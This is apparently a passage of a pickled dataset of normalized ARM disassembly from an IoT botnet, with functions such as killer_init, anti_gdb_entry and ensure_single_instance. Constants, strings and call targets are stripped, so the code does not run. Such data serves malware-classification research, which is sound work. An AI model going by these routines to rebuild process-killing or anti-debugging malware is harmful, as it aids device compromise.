S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R7,R0,LSL0\nMOV~R4,R7,LSR0\nMOV~R5,0\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nADD~R0,SP,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nMOV~R6,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R0,R1,R6\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSUB~R5,R5,0\nADD~R0,SP,0\nSUB~R0,R0,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nAND~R4,R4,0\nMOV~R4,R4,LSL0\nSUB~R8,R6,0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R6,R2,R8\nORR~R0,R4,R7,LSR0\nMOV~R1,R5\nMOV~R2,R6\nBL~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nLDRB~R3,[R1,R8]\nSTRB~R3,[R6,0]\nLDRB~R3,[R6,0]\nSTRB~R3,[R6,0]\nMOV~R3,0\nSTRB~R3,[R6,0]\nADD~R3,R3,0\nSTRB~R3,[R1,R8]\nSTRB~R3,[R6,0]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nMOV~R8,R0\nCMN~R0,0\nMOVEQ~R0,0\nBEQ~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R4\nB~FOO\nMOV~R1,0\nADD~R3,SP,0\nSUB~R3,R3,0\nADD~R1,R1,0\nLDRB~R2,[R1,R3]\nCMP~R2,0\nCMPNE~R2,0\nBNE~FOO\nCMP~R2,0\nBEQ~FOO\nADD~R0,R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R0\nMOV~R3,0\nLDRB~R3,[R2,R3]\nCMP~R3,0\nCMPNE~R3,0\nMOVEQ~R5,R0\nBEQ~FOO\nADD~R3,SP,0\nSUB~R3,R3,0\nADD~R2,R3,R1\nLDRB~R3,[R2,0]\nADD~R2,R2,0\nCMP~R3,0\nCMPNE~R3,0\nBNE~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nRSB~R3,R1,R2\nADD~R5,R3,0\nADD~R5,R5,0\nMOV~R2,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R5\nMOV~R7,0\nSTRB~R7,[R3,R2]\nADD~R6,R1,R2\nADD~R4,R6,R0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nADD~R2,SP,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nADDNE~R0,R5,0\nADDNE~R4,R6,R5\nMOVNE~R2,R7\nMOVNE~R12,R2\nMOVNE~LR,R2\nBNE~FOO\nB~FOO\nCMP~R3,0\nCMPNE~R3,0\nMOVEQ~R2,0\nBEQ~FOO\nCMP~R2,0\nBNE~FOO\nADD~R12,R12,0\nCMP~R12,0\nBNE~FOO\nLDRB~R3,[R1,0]\nCMP~R3,0\nSUBNE~R2,R2,0\nBNE~FOO\nB~FOO\nMOV~R2,0\nADD~R4,R4,0\nCMP~R12,0\nBGT~FOO\nADD~R0,R0,0\nMOV~R1,R4\nLDRB~R3,[R4,0]\nCMP~R3,0\nBNE~FOO\nMOV~R12,R0\nCMP~LR,0\nBEQ~FOO\nMOV~R2,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R0\nLDRB~R3,[R3,R2]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nADD~R3,R1,R2\nADD~R2,R3,R0\nADD~R12,R12,0\nLDRB~R3,[R2,0]\nCMP~R3,0\nCMPNE~R3,0\nBNE~FOO\nMOV~R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R12\nMOV~R3,0\nSTRB~R3,[R2,R1]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R1\nADD~R4,R3,R0\nMOV~R0,R4\nBL~FOO\nCMP~R0,0\nBGT~FOO\nADD~R0,SP,0\nSUB~R0,R0,0\nMOV~R1,R4\nBL~FOO\nB~FOO\nMOV~R4,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R0,R3,R4\nMOV~R1,0\nMOV~R2,R8\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nLDRB~R2,[R1,R4]\nCMP~R2,0\nCMPNE~R2,0\nMOVEQ~R3,0\nMOVNE~R3,0\nMOVEQ~R1,R3\nBEQ~FOO\nB~FOO\nMOV~R0,R8\nBL~FOO\nADD~R0,SP,0\nSUB~R0,R0,0\nBL~FOO\nSUBS~R4,R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nSUBS~R9,R0,0\nMOVEQ~R11,R9\nMOVNE~R11,0\nADDNE~R6,SP,0\nADDNE~R6,R6,0\nBNE~FOO\nB~FOO\nADD~R8,R0,0\nLDRB~R3,[R0,0]\nSUB~R3,R3,0\nCMP~R3,0\nBHI~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R5,SP,0\nADD~R5,R5,0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nMOV~R1,R8\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nMOV~R1,R8\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nSUBS~R10,R0,0\nBNE~FOO\nB~FOO\nADD~R5,SP,0\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R6\nBL~FOO\nMOV~R0,R6\nBL~FOO\nADD~R0,R6,R0\nMOV~R1,R8\nBL~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R6,R4\nBL~FOO\nMOV~R0,R6\nBL~FOO\nADD~R0,R6,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R6\nBL~FOO\nADD~R0,R6,R0\nADD~R1,R7,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nADD~R2,SP,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R11,0\nMOV~R0,R10\nBL~FOO\nSUBS~R7,R0,0\nBEQ~FOO\nCMP~R11,0\nBEQ~FOO\nMOV~R0,R10\nBL~FOO\nMOV~R0,R9\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nCMP~R11,0\nBEQ~FOO\nMOV~R0,R9\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nAND~R0,R11,0\nB~FOO\nMOV~R2,0\nMOV~LR,0\nADD~R4,R4,0\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p86
L1500L
tp87
a(S'killer_init'
p88
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R0,0\nBL~FOO\nMOV~R10,R0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R5,R3\nORRGT~R5,R3,0\nCMP~R5,0\nBNE~FOO\nMOV~R4,0\nADD~R1,SP,0\nSTRB~R4,[R1,0]\nSTRB~R5,[R1,0]\nSTR~R5,[R1,0]\nMOV~R0,0\nBL~FOO\nADD~R2,SP,0\nSTRB~R5,[R2,0]\nMOV~R3,0\nSTRB~R3,[R2,0]\nMOV~R0,R4\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R2,0\nADD~R3,SP,0\nSTRB~R2,[R3,0]\nMOV~R3,0\nADD~R12,SP,0\nSTRB~R3,[R12,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R8,<STR>\nSTR~R0,[R8]\nMOV~R6,0\nSTRB~R6,[R0]\nLDR~R3,<STR>\nSTR~R6,[R3]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,R6\nBL~FOO\nMOV~R1,R0\nADD~R5,SP,0\nSUB~R5,R5,0\nMOV~R0,R5\nBL~FOO\nADD~R4,R5,R0\nBL~FOO\nMOV~R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nMOV~R0,0\nMOV~R1,R6\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nMOV~R7,R0\nMOV~R0,R5\nMOV~R1,R6\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,[R8]\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nLDRNE~R3,[R8]\nSTRNEB~R6,[R3,R0]\nADD~R3,SP,0\nSUB~R3,R3,0\nADD~R1,R4,R7\nMOV~R0,R3\nRSB~R1,R3,R1\nBL~FOO\nMOV~R4,R10\nMOV~R5,0\nMOV~R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nMOV~R3,0\nSTR~R3,[SP]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nSUBS~R10,R0,0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nADD~R9,SP,0\nADD~R9,R9,0\nMOV~R12,0\nSTR~R12,[SP,0]\nADD~R1,SP,0\nADD~R1,R1,0\nLDR~R2,[SP,0]\nADD~R1,R1,R2\nSTR~R1,[SP,0]\nB~FOO\nLDRB~R3,[R0,0]\nSUB~R3,R3,0\nCMP~R3,0\nBHI~FOO\nADD~R6,R0,0\nMOV~R0,R6\nBL~FOO\nMOV~R8,R0\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nCMP~R5,R0\nBLT~FOO\nMOV~R0,0\nBL~FOO\nRSB~R0,R4,R0\nCMP~R0,0\nMOVGT~R5,0\nBGT~FOO\nCMP~R8,0\nBLE~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R9\nBL~FOO\nADD~R5,R9,R0\nMOV~R0,R5\nMOV~R1,R6\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nMOV~R0,R4\nMOV~R1,R6\nBL~FOO\nMOV~R5,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R4,R5\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R7,[SP,0]\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R6,R12,R7\nMOV~R0,R9\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nMOV~R5,R0\nCMN~R0,0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R0\nMOV~R4,0\nSTRB~R4,[R3,R7]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nMOV~R0,R6\nSUB~R1,R5,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nCMP~R8,R0\nBEQ~FOO\nBL~FOO\nCMP~R8,R0\nBEQ~FOO\nLDR~R4,[SP,0]\nMOV~R0,R4\nLDR~R3,<STR>\nLDR~R1,[R3]\nBL~FOO\nSUBS~R1,R0,0\nBNE~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nMOVEQ~R0,R8\nMOVEQ~R1,0\nBLEQ~FOO\nMOV~R0,R4\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nMOV~R6,R0\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nLDR~R7,[SP]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R11,R2,R7\nB~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R6\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R2,R7\nMOV~R2,0\nBL~FOO\nSUBS~R5,R0,0\nBGT~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R5,R8\nLDR~R4,[SP,0]\nB~FOO\nMOV~R5,R8\nLDR~R4,[SP,0]\nMOV~R0,R10\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R10\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p89
L1748L
tp90
a(S'anti_gdb_entry'
p91
S'"LDR~R2,<STR>\nLDR~R3,<STR>\nSTR~R2,[R3]\nRET"'
p92
L16L
tp93
a(S'teardown_connection'
p94
S'"STR~LR,[SP,-0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nCMN~R0,0\nBLNE~FOO\nMOV~R2,0\nLDR~R3,<STR>\nSTR~R2,[R3]\nMOV~R0,0\nBL~FOO\nLDR~PC,[SP]"'
p95
L44L
tp96
a(S'ensure_single_instance'
p97
S'"STMFD~SP!,{R4-R6,LR}\nSUB~SP,SP,0\nMOV~R4,0\nSTR~R4,[SP,0]\nMOV~R0,0\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nLDR~R6,<STR>\nSTR~R0,[R6]\nCMN~R0,0\nBEQ~FOO\nMOV~R5,0\nSTR~R5,[SP]\nMOV~R1,R4\nMOV~R2,0\nADD~R3,SP,R5\nBL~FOO\nLDR~R4,[R6]\nMOV~R0,R4\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,R5\nBL~FOO\nLDR~R3,<STR>\nLDRB~R3,[R3]\nCMP~R3,0\nMOVNE~R3,0\nADDNE~R2,R3,0\nLDREQ~R3,<STR>\nLDREQ~R2,[R3]\nMOV~R5,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R5,[SP,0]\nSTR~R2,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nBL~FOO\nMOV~R4,R0\nSTR~R5,[R0]\nADD~R6,SP,0\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBNE~FOO\nLDR~R2,<STR>\nLDRB~R3,[R2]\nCMP~R3,R5\nSTRNEB~R5,[R2]\nMOV~R2,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R2,[SP,0]\nSTR~R2,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nLDR~R4,<STR>\nLDR~R0,[R4]\nMOV~R1,R6\nADD~R2,R2,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4]\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nB~FOO\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p98
L360L
tp99
a(S'main'
p100
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nSTR~R0,[SP,0]\nSTR~R1,[SP,0]\nLDR~R0,[R1]\nBL~FOO\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R0,R4\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nMOV~R1,R4\nMOV~R2,R0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBNE~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nMOV~R0,R4\nMOV~R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R0,<STR>\nBL~FOO\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDR~R2,<STR>\nMOV~R4,0\nMOV~R3,0\nSTRB~R3,[R2]\nSTRB~R4,[R2,0]\nLDR~R3,<STR>\nSTR~R3,[R2,0]\nSTRB~R4,[R2,0]\nMOV~R3,0\nSTRB~R3,[R2,0]\nLDR~R1,[SP,0]\nLDR~R8,[R1]\nADD~R0,SP,0\nSUB~R0,R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R3,<STR>\nADD~R12,SP,0\nADD~R12,R12,0\nMOV~LR,R3\nLDMIA~LR!,{R0-R3}\nSTMIA~R12!,{R0-R3}\nLDMIA~LR!,{R0-R3}\nSTMIA~R12!,{R0-R3}\nLDR~R3,[LR]\nSTR~R3,[R12]\nMOV~R2,R4\nADD~R1,SP,0\nADD~R1,R1,0\nLDR~R3,[R2,R1]\nADD~R4,R4,R3\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nCMP~R4,0\nBEQ~FOO\nMOV~R4,0\nMOV~R7,R4\nMOV~R10,0\nADD~R6,SP,0\nADD~R6,R6,0\nMOV~R11,0\nMOV~R9,0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R4\nLDRB~R2,[R3,R11]\nLDRB~R3,[R3,R9]\nADD~R12,R7,0\nADD~R12,R12,0\nSTRB~R3,[R12,SP]\nSTRB~R2,[R6,0]\nADD~R5,R7,0\nMOV~R7,R5\nMOV~R4,R4,LSL0\nADD~R4,R4,0\nMOV~R4,R4,ASR0\nMOV~R0,R8\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nLDRB~R3,[R8,R0]\nMVN~R3,R3\nADD~R3,R10,R3\nAND~R10,R3,0\nSUB~R4,R4,0\nADD~R6,R6,0\nCMP~R5,0\nBNE~FOO\nMOV~R0,R10\nMOV~R1,0\nBL~FOO\nMOV~R0,R0,LSL0\nAND~R0,R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R0,R0,R1\nMOV~LR,PC\nLDR~PC,[R0,-0]\nMOV~R0,R8\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R4,R0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R0,R2,R11\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,R5\nBL~FOO\nTST~R4,0\nMOVNE~R0,0\nBLNE~FOO\nBL~FOO\nBL~FOO\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nBNE~FOO\nLDR~R12,[SP,0]\nLDR~R0,[R12,0]\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,R4\nLDR~R2,[SP,0]\nLDR~R1,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R4,[R3,0]\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nBL~FOO\nAND~R4,R0,0\nMOV~R4,R4,LSL0\nADD~R4,R4,0\nADD~R5,SP,0\nADD~R5,R5,0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nMOV~R6,0\nSTRB~R6,[R3,-0]\nLDR~R1,[SP,0]\nLDR~R0,[R1]\nMOV~R1,R5\nBL~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0,LSL0\nADD~R4,R4,0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R4\nSTRB~R6,[R3,-0]\nMOV~R0,0\nMOV~R1,R5\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,0\nLDR~R2,[SP,0]\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,R0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nCMP~R0,R6\nBGT~FOO\nBL~FOO\nMOV~R10,R0\nMOV~R0,R6\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nBL~FOO\nBL~FOO\nMOV~R8,R6\nMOV~R4,R6\nLDR~R7,<STR>\nMOV~R9,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R11,R3,R9\nMOV~R3,0\nADD~R2,SP,0\nADD~R2,R2,0\nSTR~R4,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R4\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nSTR~R2,[R3,R1]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nLDR~R3,<STR>\nLDR~R0,[R3]\nCMN~R0,0\nBEQ~FOO\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R2,R2,R12\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nLDR~R6,<STR>\nLDR~R3,[R6]\nCMN~R3,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R5,R0\nSTR~R0,[R6]\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nLDR~R3,<STR>\nLDR~R3,[R3]\nCMP~R3,0\nMOVNE~LR,PC\nMOVNE~PC,R3\nMOV~R2,0\nLDR~R3,<STR>\nSTRB~R2,[R3]\nLDR~R0,[R7]\nLDR~R1,<STR>\nADD~R2,R2,0\nBL~FOO\nLDR~R3,<STR>\nLDRB~R3,[R3]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R7]\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,R2,R1\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nB~FOO\nLDR~R0,[R7]\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R2,R3\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nLDR~R5,<STR>\nLDR~R3,<STR>\nLDR~R0,[R3]\nLDR~R3,[R5]\nCMP~R0,R3\nMOVLT~R0,R3\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R3,[SP]\nADD~R0,R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nMOV~R3,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nBNE~FOO\nSTRB~R0,[SP,0]\nSTRB~R0,[SP,0]\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nADD~R8,R8,0\nCMP~R0,0\nBNE~FOO\nLDR~R0,[R5]\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,<STR>\nLDR~R0,[R3]\nCMN~R0,0\nBEQ~FOO\nMOV~R3,R0,LSR0\nMOV~R3,R3,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R3,R12\nAND~R2,R0,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R1,R12,R9\nADD~R2,SP,0\nADD~R2,R2,0\nBL~FOO\nBL~FOO\nBL~FOO\nBL~FOO\nRSB~R0,R10,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R2,<STR>\nLDRB~R3,[R2]\nCMP~R3,0\nBEQ~FOO\nSTRB~R4,[R2]\nLDR~R0,[R7]\nMOV~R3,R0,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R2,R0,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBNE~FOO\nBL~FOO\nB~FOO\nSTR~R4,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R3,[SP]\nMOV~R1,